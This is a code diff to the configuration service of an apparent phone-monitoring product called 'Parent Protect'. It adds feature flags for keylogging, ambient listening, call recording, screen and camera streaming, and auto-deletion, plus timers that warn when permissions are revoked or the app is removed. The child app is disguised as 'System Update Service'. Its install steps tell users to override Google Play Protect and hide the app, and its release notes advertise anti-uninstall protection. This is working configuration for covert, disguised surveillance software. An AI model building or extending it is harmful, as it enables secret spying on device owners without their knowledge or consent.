@@ -315,6 +315,18 @@ export const DEFAULT_OPTIONS = {
   storageWarnDialogPercent: 80, // %
   storageWarnDialogIntervalInMinute: 1440, // minutes (default 1 day)
 
+  // Critical Permission Warning config (active backend config table values)
+  permissionOffWarNotificationIntervalInMinute: 2, // minutes (active: 2 mins)
+  permissionOffWarNotificationAfterTimeInMinute: 10, // minutes (active: 10 mins)
+  permissionOffWarDialogIntervalInMinute: 3, // minutes (active: 3 mins)
+  permissionOffWarDialogAfterTimeInMinute: 15, // minutes (active: 15 mins)
+
+  // App Removed Warning config (active backend config table values)
+  appRemovedWarNotificationIntervalInMinute: 3, // minutes (active: 3 mins)
+  appRemovedWarNotificationAfterTimeInMinute: 15, // minutes (active: 15 mins)
+  appRemovedWarDialogIntervalInMinute: 2, // minutes (active: 2 mins)
+  appRemovedWarDialogAfterTimeInMinute: 10, // minutes (active: 10 mins)
+
   liveSessionMaxMin: 60,
   showStorageAddonPlanForFirst: true,
   showLiveLimitAddonPlanForFirst: true,
@@ -332,7 +344,7 @@ export const DEFAULT_OPTIONS = {
   // Dynamic Profile & App Configs
   onlineThresholdSeconds: 150,
   childAppName: 'System Update Service',
-  childAppUrl: 'https://parentprotect.app/download/SystemUpdateService.apk',
+  childAppUrl: 'https://parentprotect.app/download/child-app-latest.apk',
   childDeviceSecretCodeMaxAttempt: 5,
   privacyPolicyUrl: 'https://parentprotect.app/privacy',
   supportEmail: 'support@parentprotect.app',
@@ -340,7 +352,7 @@ export const DEFAULT_OPTIONS = {
   supportEmailBody: 'Hello Support Team,\n\nI need help with my Parent Protect account.\n\nAccount: {phone}\nDevice: {device}\n\nDetails:\n',
   appShareText: 'Protect your child online with Parent Protect. Download now: https://parentprotect.app',
   appShareUrl: 'https://parentprotect.app',
-  playStoreUrl: 'market://details?id=com.parentprotect.parent_app',
+  playStoreParentAppUrl: 'https://play.google.com/store/apps/details?id=com.childprotect.phonemonitoring',
 
   // Version Control & Updates
   parentAppVersion: 100,
@@ -351,23 +363,37 @@ export const DEFAULT_OPTIONS = {
   childAppVersion: 100,
   childAppVersionName: 'v1.0.0',
   childAppReleaseNotes: '• Social App Call Recording (WhatsApp, IG)\n• Enhanced Anti-Uninstall protection\n• Battery & background performance optimizations\n• Stability fixes for Android 14/15/16',
-  childAppUpdateTitle: 'Child Companion Update Available',
-  childAppUpdateMessage: 'A new update is available for child devices to support latest features and continuous monitoring.',
   childAppUpdateSteps: [
     '1. Open the download link on child phone browser to download APK.',
     '2. Tap downloaded APK to Install (Overwrite update). If Google Play Protect asks for confirmation, tap "Install Anyway".',
-    '3. Open app, enter your Secret Parent PIN, verify permissions, and tap Hide App.'
+    '3. Open app, enter your Secret Parent PIN, verify permissions, and tap Hide App.',
   ],
   childAppNeedToUpdate: false,
   childAppNeedToUpdateInterval: 1440,
+  childAppNeedToUpdateIntervalForNotification: 1440,
 
-  // Feature Minimum Child App Version Gating
-  featureMinVersion: {
-    socialCallRecording: 102,
+  // Feature Minimum Child App Version Gating (20 canonical features)
+  featureMinChildAppVersion: {
     callRecording: 100,
+    socialCallRecording: 100,
     ambientListening: 100,
     screenStreaming: 100,
     cameraStreaming: 100,
+    liveControl: 100,
+    recordVideo: 100,
+    recordScreen: 100,
+    recordAudio: 100,
+    takeScreenshot: 100,
+    scheduleScreenshot: 100,
+    keywordTracker: 100,
+    keylogger: 100,
+    installedApps: 100,
+    appUsageTimeline: 100,
+    deviceInfo: 100,
+    locationTracker: 100,
+    contacts: 100,
+    photos: 100,
+    autoDelete: 100,
   },
 
   // Developer Mode Restrictions
@@ -449,6 +475,10 @@ export class ConfigService {
           {
             key: {
               $in: [
+                'playStoreUrl',
+                'childAppUpdateTitle',
+                'childAppUpdateMessage',
+                'featureMinVersion',
                 'permissionGuides',
                 'manualScreenshotDefaultQuality',
                 'keywordTrackerScreenshotDefaultQuality',
@@ -488,6 +518,18 @@ export class ConfigService {
         { key: 'privacyPolicyUrl', value: 'https://www.youtube.com' },
         { value: 'https://parentprotect.app/privacy' }
       );
+
+      // Upsert active warning config values to MongoDB Config collection
+      await Config.bulkWrite([
+        { updateOne: { filter: { key: 'permissionOffWarNotificationIntervalInMinute' }, update: { $set: { value: 2 } }, upsert: true } },
+        { updateOne: { filter: { key: 'permissionOffWarNotificationAfterTimeInMinute' }, update: { $set: { value: 10 } }, upsert: true } },
+        { updateOne: { filter: { key: 'permissionOffWarDialogIntervalInMinute' }, update: { $set: { value: 3 } }, upsert: true } },
+        { updateOne: { filter: { key: 'permissionOffWarDialogAfterTimeInMinute' }, update: { $set: { value: 15 } }, upsert: true } },
+        { updateOne: { filter: { key: 'appRemovedWarNotificationIntervalInMinute' }, update: { $set: { value: 3 } }, upsert: true } },
+        { updateOne: { filter: { key: 'appRemovedWarNotificationAfterTimeInMinute' }, update: { $set: { value: 15 } }, upsert: true } },
+        { updateOne: { filter: { key: 'appRemovedWarDialogIntervalInMinute' }, update: { $set: { value: 2 } }, upsert: true } },
+        { updateOne: { filter: { key: 'appRemovedWarDialogAfterTimeInMinute' }, update: { $set: { value: 10 } }, upsert: true } },
+      ]).catch(() => {});
 
       const dbConfigs = await Config.find().lean();
       const existingKeys = new Set(dbConfigs.map((item) => item.key));
